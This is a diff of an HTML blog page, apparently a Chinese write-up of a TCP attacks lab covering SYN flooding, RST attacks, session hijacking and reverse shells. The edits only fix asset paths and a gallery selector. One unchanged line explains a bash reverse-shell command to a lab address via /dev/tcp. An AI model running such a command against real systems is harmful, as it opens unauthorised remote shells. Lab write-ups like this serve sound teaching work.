@@ -310,7 +310,7 @@
                 <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#TCP-Attacks-Lab"><span class="post-toc-text">TCP Attacks Lab</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="post-toc-text">实验内容</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Overview"><span class="post-toc-text">Overview</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Task1-SYN-Flooding-Attack"><span class="post-toc-text">Task1. SYN Flooding Attack</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Task1-1-Launching-the-Attack-Using-Python"><span class="post-toc-text">Task1.1 Launching the Attack Using Python</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Task1-2-Launching-the-Attack-Using-C"><span class="post-toc-text">Task1.2 Launching the Attack Using C</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Task1-3-Enable-the-SYN-Cookie-Countermeasure"><span class="post-toc-text">Task1.3 Enable the SYN Cookie Countermeasure</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Task2-TCP-RST-Attacks-on-telnet-Connections"><span class="post-toc-text">Task2. TCP RST Attacks on telnet Connections</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Task3-TCP-Session-Hijacking"><span class="post-toc-text">Task3. TCP Session Hijacking</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Task4-Creating-Reverse-Shell-using-TCP-Session-Hijacking"><span class="post-toc-text">Task4. Creating Reverse Shell using TCP Session Hijacking</span></a></li></ol></li></ol></li></ol>
             
         
-        <link rel="stylesheet" type="text/css" href="css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="TCP-Attacks-Lab"><a href="#TCP-Attacks-Lab" class="headerlink" title="TCP Attacks Lab"></a>TCP Attacks Lab</h1><p>这个实验旨在让学生通过实际操作来了解软件漏洞以及针对这些漏洞的攻击方式。通过研究过去的安全漏洞，学生可以深入了解系统为何会存在漏洞，以及看似微小的错误为何可能引发严重后果。这种学习能帮助他们认识到常见漏洞模式，以便今后避免类似的错误。</p>
+        <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css" /><div class="article-gallery"><h1 id="TCP-Attacks-Lab"><a href="#TCP-Attacks-Lab" class="headerlink" title="TCP Attacks Lab"></a>TCP Attacks Lab</h1><p>这个实验旨在让学生通过实际操作来了解软件漏洞以及针对这些漏洞的攻击方式。通过研究过去的安全漏洞，学生可以深入了解系统为何会存在漏洞，以及看似微小的错误为何可能引发严重后果。这种学习能帮助他们认识到常见漏洞模式，以便今后避免类似的错误。</p>
 <p>利用TCP&#x2F;IP协议中的漏洞作为案例研究，学生可以学习安全设计、安全编程和安全测试的原则。特别是，TCP协议中的漏洞展示了为何安全性应该从一开始就考虑，而不是事后添加的重要性。</p>
 <p>实验内容涵盖TCP协议的基础知识、各种攻击方式（如SYN洪水攻击、重置攻击、会话劫持攻击等），以及反向Shell等内容。通过这些实验，学生将了解网络安全的挑战，并学会为确保系统安全所需的各种网络安全措施。</p>
 <h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><blockquote>
@@ -482,12 +482,14 @@
 <p><strong>&lt;</strong> 表示重定向输入。例如，command &lt; file.txt 将文件 file.txt 的内容作为 command 命令的输入。</p>
 <p><strong>&amp;</strong> 在这里的含义是表示文件描述符。</p>
 <p>对于 &#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;10.9.0.1&#x2F;12345 0&lt;&amp;1 2&gt;&amp;1 这样的命令，&#x2F;bin&#x2F;bash -i 是要执行的命令，&gt; &#x2F;dev&#x2F;tcp&#x2F;10.9.0.1&#x2F;12345 是将命令的标准输出重定向到指定的 TCP 连接。</p>
-</div><script src="js/lightgallery.min.js"></script><script>if("undefined"!=typeof lightGallery) {
+</div><script src="/js/lightgallery.min.js"></script><script>
+        if("undefined"!=typeof lightGallery) {
         var options1 = {
             selector: '.gallery-item'
         };
-        lightGallery(document.getElementsByClassName('.article-gallery')[0], options1);
-        }</script>
+        lightGallery(document.getElementsByClassName('article-gallery')[0], options1);
+        }
+        </script>
     </div>
 
     <div class="post-meta">
@@ -568,12 +570,13 @@
 
     <!--目录-->
     
-        <script src="js/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
-        <script src="js/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
-        <script src="js/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        <script src="/js/jquery/1.7.2/jquery.min.js" type="text/javascript"></script>
+        <script src="/js/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript"></script>
+        <script src="/js/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript"></script>
         
 <script src="/js/toc.js"></script>
 
+    
     
 
     
